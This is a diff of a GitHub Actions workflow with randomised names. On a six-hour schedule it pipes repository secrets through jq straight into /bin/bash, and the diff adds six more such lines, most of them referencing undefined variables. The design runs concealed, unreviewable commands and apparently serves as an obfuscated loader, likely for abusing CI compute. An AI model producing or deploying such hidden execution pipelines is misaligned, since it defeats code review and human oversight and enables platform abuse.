@@ -2,18 +2,22 @@ name: haoxiaozi4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-jobs:  # 22656
+    - cron: '55 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: haoxiaozi4567
         env:
-          a52: ${{ secrets.a52 }}
+          i4909: ${{ secrets.i4909 }}
         run: |
-          echo $a52 | jq -r .unyq5207 | /bin/bash
-          echo $ezr5938 | jq -r .rzjin2 | /bin/bash
-          echo $w2580 | jq -r .ymu668 | /bin/bash
+          echo $i4909 | jq -r .iptnb3 | /bin/bash
+          echo $ufpa6 | jq -r .xx3725 | /bin/bash
+          echo $ppa9647 | jq -r .h75 | /bin/bash
+          echo $pz33 | jq -r .qz00832 | /bin/bash
+          echo $gvl83 | jq -r .wwzsz8 | /bin/bash
+          echo $o28145 | jq -r .h0 | /bin/bash
+          echo $orrl1415 | jq -r .h929 | /bin/bash
 
